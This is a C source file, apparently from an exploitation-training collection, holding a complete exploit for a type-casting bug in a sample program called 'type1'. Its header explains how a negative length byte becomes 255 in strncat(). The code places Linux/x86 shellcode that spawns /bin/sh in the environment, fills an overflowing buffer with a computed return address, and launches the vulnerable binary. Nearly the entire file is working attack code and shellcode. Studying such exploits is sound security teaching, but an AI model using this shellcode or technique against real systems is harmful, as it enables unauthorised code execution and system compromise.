/*
 * $Id: type1-ex.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * type1-ex.c - type1.c exploit (type casting error)
 * Copyright (c) 2003 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This program exploits a type casting error of len variable. Specifically,
 * strncat() declares its third parameter as size_t (unsigned int), while 
 * both char and int are signed types. This allows an attacker to inject a 
 * negative number (e.g. 0xff), that will be interpreted as 255 instead of 
 * -1 by the strncat() function. 
 *
 * Though, the overflow checking routine in func() is flawed.
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF	78	// 1 + 76 + 1

char sc[]= /* linux/x86 shellcode */
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main()
{
	char buf[BUF];
	int i;
	int *p = (int *)(buf + 1);
	
	/* put the shellcode in env */
	char *env[2] = {sc, NULL};
	int ret = 0xbffffffa - strlen(sc) - strlen("./type1");

	fprintf(stderr, "Using ret: %p\n", ret);

	/* negative value, to trigger overflow */
	buf[0] = '\xff';

	/* put ret into the whole buffer */
	for (i = 1; i < BUF - 1; i += 4)
		*p++ = ret;
	*p = 0x0;

	/* run the vulnerable program */
	execle("./type1", "type1", buf, NULL, env);
	perror("execle");
}
